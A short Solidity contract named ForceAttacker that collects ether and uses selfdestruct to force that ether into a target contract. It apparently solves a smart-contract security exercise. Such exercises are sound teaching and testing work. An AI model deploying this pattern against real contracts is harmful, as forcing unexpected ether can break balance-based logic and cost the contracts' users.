// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

contract ForceAttacker {

    function receivePayment() external payable{}

    function getBalance() external view returns(uint) {
        return address(this).balance;
    }

    function destroyContract(address _otherContract) external {
        selfdestruct(payable(_otherContract));
    }
    
}

